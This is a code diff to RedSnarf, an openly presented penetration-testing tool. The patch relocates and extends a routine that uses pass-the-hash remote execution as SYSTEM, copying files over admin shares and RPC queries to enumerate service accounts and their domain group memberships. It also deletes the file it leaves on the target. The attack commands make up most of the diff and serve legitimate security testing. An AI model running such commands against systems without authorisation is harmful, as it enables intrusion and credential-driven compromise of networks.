@@ -107,6 +107,8 @@ def banner():
 	print colored("R Davy - NCCGroup\n",'red')
 
 
+
+
 def dns_server_name(username,password,host,domain_name):
 	user=args.username.strip()
 	passw=args.password.strip()
@@ -1043,36 +1045,6 @@ def datadump(user, passw, host, path, os_version):
 			else:
 				print colored("[-]No logged on users found: "+host,'red')	
 				logging.debug("[-]No logged on users found: "+host)
-
-			#TODO - This can probably be removed given the above check.
-			if service_accounts in yesanswers:
-				print colored("\n[+]Checking for services running as users: "+host+"\n",'yellow')
-				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C wmic service get startname | findstr /i /V startname | findstr /i /V NT | findstr /i /V localsystem > c:\\users.txt\" 2>/dev/null")
-				os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+path+host+"; get users.txt\' 2>/dev/null")
-				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\users.txt\" 2>/dev/null")
-				res = os.stat(path+host+"/users.txt").st_size > 3
-				if res==True:
-					try:
-						u = open(path+host+"/users.txt").read().splitlines()
-						for n in u:
-							if n:
-								print colored("[+]Account Retrieved "+n,'yellow')
-								
-								#Get usernames and query domain for memberships
-								print colored("[+]Attempting to get account details "+n,'green')
-																	
-								proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C net user "+n.split("\\")[1]+" /domain \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
-								stdout_value = proc.communicate()[0]
-								
-								if "User name" in stdout_value:
-									print stdout_value
-								else:
-									print "[-]Unable to retrieve account details from DC"
-					except IOError as e:
-						print "I/O error({0}): {1}".format(e.errno, e.strerror)
-				else:
-					print colored("[-]No service accounts found: "+host,'red')	
-					logging.info("[-]No service accounts found: "+host)
 
 			if lsass_dump in yesanswers:
 				if not os.path.isfile("/opt/Procdump/procdump.exe"):
@@ -2158,7 +2130,7 @@ def main():
 
 #Display the user menu.
 banner()
-p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.5e", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
+p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.5f", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
 
 # Creds
 p.add_argument("-H", "--host", dest="host", help="Specify a hostname -H ip= / range -H range= / targets file -H file= to grab hashes from")
@@ -4608,6 +4580,68 @@ if user_desc in yesanswers:
 	else:
 		print colored ('\n[-]It is only possible to use this function on a single target and not a range','red')
 		sys.exit()
+
+#This enumerates accounts running services, we get the basics of this during normal enumeration however this function gets group memberships
+if service_accounts in yesanswers:
+	print colored("\n[+]Checking for services running as users: "+targets[0]+"\n",'yellow')
+	os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C wmic service get startname | findstr /i /V startname | findstr /i /V NT | findstr /i /V localsystem > c:\\users.txt\" 2>/dev/null")
+	os.system("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+targets[0]+"; get users.txt\' 2>/dev/null")
+	os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C del c:\users.txt\" 2>/dev/null")
+	res = os.stat(outputpath+targets[0]+"/users.txt").st_size > 3
+	if res==True:
+		try:
+			u = open(outputpath+targets[0]+"/users.txt").read().splitlines()
+			for n in u:
+				if n:
+					print colored("[+]Account Retrieved "+n,'yellow')
+					
+					#Get usernames and query domain for memberships
+					print colored("[+]Attempting to get account details "+n,'green')
+														
+					#First method net user account /domain to get account details may fail depending on what privs we have
+					proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C net user "+n.split("\\")[1]+" /domain \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+					stdout_value = proc.communicate()[0]
+					
+					#If it's succcessful print details to screen else try and get details via RPC enumeration
+					if "User name" in stdout_value:
+						print stdout_value
+					else:
+						print "[-]Unable to retrieve account details from DC using method, going to try using RPC \n"
+						
+						#Get Group Membership using RPC to enumerate details
+						print colored("[+]Attempting to retrieve Group Membership via RPC",'green')
+						
+						#Get DC ip from domain name
+						dcip=socket.gethostbyname(domain_name)
+
+						#Query RPC for user details
+						proc = subprocess.Popen("rpcclient "+dcip+" -U "+user+"%"+passw+" -c \"queryuser "+n.split("\\")[1]+"\"", stdout=subprocess.PIPE,shell=True)
+						stdout_value = proc.communicate()[0]
+						
+						#Cycle through output
+						for line in stdout_value.splitlines():
+							#If we hit a user_rid line grab info and queryusergroups
+							if "user_rid" in line:
+								proc = subprocess.Popen("rpcclient "+dcip+" -U "+user+"%"+passw+" -c \"queryusergroups "+line[12:len(line)]+"\"", stdout=subprocess.PIPE,shell=True)
+								stdout_value = proc.communicate()[0]
+								#Cycle output											
+								for grid in stdout_value.splitlines():
+									#If we hit group rid, grab info and querygroup to get full information
+									if "group rid" in grid:
+										proc = subprocess.Popen("rpcclient "+dcip+" -U "+user+"%"+passw+" -c \"querygroup "+grid[12:17].lstrip()+"\"", stdout=subprocess.PIPE,shell=True)
+										stdout_value = proc.communicate()[0]
+										#This (should) print Group Memberships to screen
+										print stdout_value
+
+
+		except IOError as e:
+			print "I/O error({0}): {1}".format(e.errno, e.strerror)
+	else:
+		print colored("[-]No service accounts found: "+targets[0],'red')	
+		logging.info("[-]No service accounts found: "+targets[0])
+
+	sys.exit()
+
 if targets is None:
 	print colored ('[-]You have not entered a target!, Try --help for a list of parameters','red')
 	sys.exit()
